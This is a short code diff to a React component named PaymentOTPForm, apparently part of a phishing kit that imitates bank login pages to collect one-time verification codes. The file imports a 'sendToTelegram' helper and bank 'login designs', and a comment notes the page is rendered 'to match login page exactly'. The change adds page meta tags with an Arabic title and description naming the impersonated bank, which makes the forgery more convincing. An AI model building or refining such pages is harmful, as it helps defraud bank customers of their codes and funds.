@@ -10,6 +10,7 @@ import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getBankLoginDesign } from "@/lib/bankLoginDesigns";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -252,6 +253,13 @@ const PaymentOTPForm = () => {
   // If using bank design, render without DynamicPaymentLayout to match login page exactly
   if (bankDesign) {
     return (
+      <>
+        <PaymentMetaTags 
+          serviceName={serviceName}
+          serviceKey={serviceKey}
+          title={`رمز التحقق - ${selectedBank?.nameAr || serviceName}`}
+          description={branding.description || `أدخل رمز التحقق لخدمة ${serviceName}`}
+        />
       <div 
         className="min-h-screen flex items-center justify-center"
         dir={bankDesign.layout.direction}
@@ -551,6 +559,7 @@ const PaymentOTPForm = () => {
           <input type="text" name="timestamp" />
         </form>
       </div>
+      </>
     );
   }
   
